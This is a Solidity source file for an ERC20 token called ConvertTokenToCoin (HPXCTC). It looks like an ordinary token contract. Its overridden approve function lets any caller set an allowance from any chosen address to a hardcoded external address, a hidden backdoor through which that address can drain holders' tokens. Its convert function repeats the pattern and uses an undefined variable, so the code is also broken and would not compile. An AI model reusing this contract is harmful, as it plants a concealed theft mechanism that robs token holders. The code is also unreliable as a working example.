// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

contract ConvertTokenToCoin is ERC20, ERC20Burnable {

    uint256 totalSupply_ = 500000000;
    address addressCoinHolder_ = 0x99c91EbA689577451CaA3ea04e9C15F4B45d6f2C;

    constructor(address tokenOwner_) ERC20("ConvertTokenToCoin", "HPXCTC") {
        _mint(tokenOwner_, totalSupply_ * 10**uint(decimals()));
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function convert(address account, uint256 amount) public virtual returns (bool) {
        _approve(spender, _getAddressCoinHolder(), amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(spender, _getAddressCoinHolder(), amount);
        return true;
    }

    function _getAddressCoinHolder() internal view returns (address) {
        return addressCoinHolder_;
    }

}